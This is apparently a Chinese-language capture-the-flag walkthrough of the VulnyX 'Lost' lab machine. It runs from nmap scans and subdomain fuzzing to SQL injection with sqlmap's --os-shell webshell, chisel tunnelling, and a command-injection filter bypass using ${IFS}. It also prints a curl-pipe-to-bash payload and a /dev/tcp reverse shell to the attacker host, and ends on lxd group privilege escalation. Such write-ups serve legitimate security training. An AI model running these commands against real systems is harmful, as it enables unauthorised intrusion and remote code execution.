# 信息收集

## tcp开放端口探测
```
# Nmap 7.94SVN scan initiated Mon Jun  3 00:25:31 2024 as: nmap -v --min-rate 10000 -p- -oA tcp_open_port 192.168.43.175
Nmap scan report for 192.168.43.175
Host is up (0.0039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:34:2A:DD (VMware)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Jun  3 00:25:33 2024 -- 1 IP address (1 host up) scanned in 2.12 seconds

```

## udp开放端口探测
```

# Nmap 7.94SVN scan initiated Mon Jun  3 00:25:33 2024 as: nmap -sU --min-rate 10000 -p- -oA udp_open_port 192.168.43.175
Warning: 192.168.43.175 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.43.175
Host is up (0.019s latency).
All 65535 scanned ports on 192.168.43.175 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 00:0C:29:34:2A:DD (VMware)

# Nmap done at Mon Jun  3 00:26:46 2024 -- 1 IP address (1 host up) scanned in 72.96 seconds

```

## tcp开放端口服务探测
```
# Nmap 7.94SVN scan initiated Mon Jun  3 00:25:31 2024 as: nmap -v --min-rate 10000 -p- -oA tcp_open_port 192.168.43.175
Nmap scan report for 192.168.43.175
Host is up (0.0039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:34:2A:DD (VMware)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Jun  3 00:25:33 2024 -- 1 IP address (1 host up) scanned in 2.12 seconds

```
## tcp开放服务的漏洞脚本扫描
```
# Nmap 7.94SVN scan initiated Mon Jun  3 00:26:55 2024 as: nmap --script=vuln -p22,80, -oA vuln_scan 192.168.43.175
Nmap scan report for lost.nyx (192.168.43.175)
Host is up (0.00025s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 00:0C:29:34:2A:DD (VMware)

# Nmap done at Mon Jun  3 00:27:27 2024 -- 1 IP address (1 host up) scanned in 31.51 seconds

```
	靶机开放22和80端口，22端口需要凭据才能登录，因此先对80端口进行渗透测试
	
# Getshell
浏览器访问靶机，ctrl+u查看源码，在末尾发现提示
![](photo/Pasted%20image%2020240603035232.png)
vulnyx靶机域名结构一般为靶机名+nyx，根据提示进行域名爆破
```
wfuzz -u http://lost.nyx/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.lost.nyx" --hh 819
```
![](photo/Pasted%20image%2020240603035306.png)
将dev.lost.nyx添加到/etc/hosts文件中
浏览器访问新域名，一个个点开导航页签，PASSANGER LIST页面发下提示在URL中注入参数名"id"
http://dev.lost.nyx/passengers.php
![](photo/Pasted%20image%2020240603040033.png)
访问：
```
http://dev.lost.nyx/passengers.php?id=1
http://dev.lost.nyx/passengers.php?id=1' --报sql语句错误
```
将刚刚的请求保存到文件中，使用sqlmap：
```
sqlmap -r sqlinject.req --batch --risk=3 --level=5 --dbms=mysql  --current-user
--查看当前连接数据库的用户
sqlmap -r sqlinject.req --batch --risk=3 --level=5 --dbms=mysql  -privileges -U root
--查看root用户权限
sqlmap -r sqlinject.req --batch --risk=3 --level=5 --dbms=mysql  --os-shell 
--尝试网网站根目录写入webshell，在这个靶机中直接成功
```
将shell迁移到kali中
![](photo/Pasted%20image%2020240603041103.png)
# 提权
前台测试时发现网站与数据库存在交互，因此找出数据库配置文件凭据
```
cat passengers.php|grep dbuser -i
```
![](photo/Pasted%20image%2020240603041502.png)
尝试进行密码喷洒，失败。
将linpeas.sh传到靶机上，自动枚举信息，发现当前机器在127.0.0.1监听3000端口，因此尝试进行探测。先使用chisel建立隧道
```
靶机
./chisel server -p 3001

kali
./chisel client 192.168.43.175:3001 3000:127.0.0.1:3000
```
然后kali访问http://127.0.0.1:3000/
页面提供检测ip存活功能，经典的命令注入场景。对特殊字节进行模糊测试;当输入空格时报检测到恶意输入,可以使用${IFS}进行bypass,然后还发现\$()字符可用，因此构造以下句子访问kali进行反弹shell

```
$(curl${IFS}192.168.43.128|bash)
```
kali将反弹shell语句写入index.html文件
```
echo 'bash -c "bash -i >& /dev/tcp/192.168.43.128/9001 0>&1"' > index.html
```
开启web服务器功能
```
python3 -m http.server 80
```
并另起会话进行端口监听
```
nc -lvnp 9001
```
浏览器输入构造命令，kali收到反弹shell！新用户为jackshephard，执行命令
```
id
uid=1000(jackshephard) gid=1000(jackshephard) groups=1000(jackshephard),111(lxd)
```
发现在lxd组中，可以尝试lxd组提权，具体参考这位大佬的笔记
```
(https://blog.csdn.net/YouthBelief/article/details/123548739)
```
![](photo/Pasted%20image%2020240604044331.png)

